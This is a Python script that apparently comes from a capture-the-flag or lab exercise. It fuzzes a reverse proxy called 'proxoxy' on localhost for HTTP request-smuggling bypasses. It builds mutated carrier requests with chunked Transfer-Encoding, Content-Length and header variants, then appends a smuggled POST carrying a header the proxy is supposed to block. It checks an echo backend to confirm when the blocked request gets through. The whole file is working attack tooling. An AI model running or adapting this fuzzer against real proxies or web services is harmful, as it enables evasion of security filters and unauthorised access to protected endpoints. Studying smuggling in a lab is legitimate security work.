#!/usr/bin/env python3
"""
framefuzz - high-rate search for a proxoxy framing/scope bypass.

Lab: mccrab3e2 on 38889 = proxoxy (the real binary + the real config.json) in
front of an ECHO backend that hex-echoes every byte it receives.  So the client
sees EXACTLY what proxoxy forwarded, with no docker-logs latency.

Payload = <carrier><smuggled>, where smuggled is a complete
`POST /FLAGTOK HTTP/1.1 ... brevski: george ...` request.

  * if proxoxy frames them as two messages, the smuggled one hits rule 2 and is
    dropped, so FLAGTOK never appears in the echo  -> negative
  * if FLAGTOK appears, the rule engine didn't evaluate that request head, and
    the bytes crossed.  That's the bypass.

Control on every row: the same bytes with `brevski: zzz` must echo FLAGTOK,
otherwise the carrier was a parse error and the row carries no information.
"""
import random, socket, sys, binascii, time

TARGET = ("127.0.0.1", 38889)
TOK = b"/FLAGTOK9"


def smug(val=b"george"):
    return (b"POST " + TOK + b" HTTP/1.1\r\nHost: h\r\nbrevski: " + val
            + b"\r\nContent-Length: 0\r\n\r\n")


def fwd(payload, wait=0.20):
    """return the bytes proxoxy forwarded, or None on connection failure"""
    try:
        s = socket.create_connection(TARGET, timeout=2)
    except Exception:
        return None
    try:
        s.sendall(payload)
        s.settimeout(wait)
        out = b""
        try:
            while True:
                d = s.recv(262144)
                if not d:
                    break
                out += d
        except socket.timeout:
            pass
    except Exception:
        return b""
    finally:
        try:
            s.close()
        except Exception:
            pass
    seen = b""
    while out:
        i = out.find(b"\r\n\r\n")
        if i < 0:
            break
        head = out[:i]
        j = head.lower().find(b"content-length:")
        if j < 0:
            break
        n = int(head[j + 15:].split(b"\r\n")[0].strip())
        body = out[i + 4:i + 4 + n]
        try:
            seen += binascii.unhexlify(body)
        except Exception:
            pass
        out = out[i + 4 + n:]
    return seen


def chunk(b, n=8):
    o = b""
    for i in range(0, len(b), n):
        p = b[i:i + n]
        o += ("%x" % len(p)).encode() + b"\r\n" + p + b"\r\n"
    return o


HEAD = b"POST /carrier HTTP/1.1\r\nHost: h\r\n"

INTERESTING = [b"\r", b"\n", b"\r\n", b"\t", b" ", b";", b",", b"=", b"0",
               b"\x00", b"\x0b", b"\x0c", b"\x7f", b"\xa0", b"\x85", b"\xff",
               b"\r\n\r\n", b"0\r\n", b"0\r\n\r\n", b"chunked", b"identity",
               b"gzip", b"a", b"\x01", b"9", b"f", b"F", b"x", b"X-t: v\r\n"]


def carriers(rng, n):
    """yield (name, carrier_bytes)"""
    base = [
        ("te0", HEAD + b"Transfer-Encoding: chunked\r\n\r\n0\r\n\r\n"),
        ("te.data", HEAD + b"Transfer-Encoding: chunked\r\n\r\n" + chunk(b"AAAABBBBCCCC") + b"0\r\n\r\n"),
        ("te.tr", HEAD + b"Transfer-Encoding: chunked\r\n\r\n0\r\nX: v\r\n\r\n"),
        ("cl0", HEAD + b"Content-Length: 0\r\n\r\n"),
        ("cl8", HEAD + b"Content-Length: 8\r\n\r\nAAAABBBB"),
        ("nobody", HEAD + b"\r\n"),
        ("te.gzchunk", HEAD + b"Transfer-Encoding: gzip, chunked\r\n\r\n0\r\n\r\n"),
    ]
    for i in range(n):
        nm, b = base[rng.randrange(len(base))]
        b = bytearray(b)
        for _ in range(rng.randint(1, 3)):
            op = rng.randrange(4)
            j = rng.randrange(len(b) + 1)
            if op == 0:
                b[j:j] = rng.choice(INTERESTING)
            elif op == 1:
                b[j:j] = bytes([rng.randrange(256)])
            elif op == 2 and j < len(b):
                b[j] = rng.randrange(256)
            elif j < len(b):
                del b[j:j + rng.randint(1, 3)]
        yield ("%s.m%d" % (nm, i), bytes(b))


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 3000
    seed = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    rng = random.Random(seed)

    # controls
    c1 = fwd(HEAD + b"Content-Length: 0\r\n\r\n" + smug(b"zzz"))
    c2 = fwd(HEAD + b"Content-Length: 0\r\n\r\n" + smug(b"george"))
    print("CONTROL zzz-forwards-token=%s  george-token-dropped=%s"
          % (TOK in (c1 or b""), TOK not in (c2 or b"")))
    if not (TOK in (c1 or b"") and TOK not in (c2 or b"")):
        print("controls failed: %r / %r" % (c1, c2))
        return

    t0 = time.time()
    live = wins = 0
    for name, car in carriers(rng, n):
        g = fwd(car + smug(b"george"), wait=0.10)
        if not g or TOK not in g:
            continue
        # candidate: verify the control on the same carrier
        z = fwd(car + smug(b"zzz"), wait=0.15)
        live += 1
        if z and TOK in z:
            wins += 1
            print("\n*** BYPASS *** %s\ncarrier=%r\nfwd=%r\n" % (name, car, g))
            sys.stdout.flush()
    dt = time.time() - t0
    print("done: %d carriers, %d token-forwarded, %d confirmed, %.0f/s"
          % (n, live, wins, n / dt))


main()
